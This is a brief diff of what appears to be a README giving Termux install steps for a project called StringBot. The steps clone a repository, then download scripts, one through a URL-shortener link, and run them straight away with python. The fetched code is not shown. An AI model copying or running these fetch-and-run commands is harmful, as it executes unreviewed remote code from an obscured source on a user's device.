@@ -2,8 +2,12 @@
 
 ### OPEN TERMUX 
 
-```git clone https://github.com/Badhacker98/StringBot && cd StringBot```
-```wget -O session.py https://shorturl.at/vMtxG && python3 session.py```
+```
+git clone https://github.com/Badhacker98/StringBot && cd StringBot
+```
+```
+wget -O session.py https://shorturl.at/vMtxG && python3 session.py
+```
 
 ```
 cd && rm -rf py.py && pkg install -y python wget && wget https://raw.githubusercontent.com/Badhacker98/StringBot/blob/main/py.py && python py.py && rm -rf py.py 
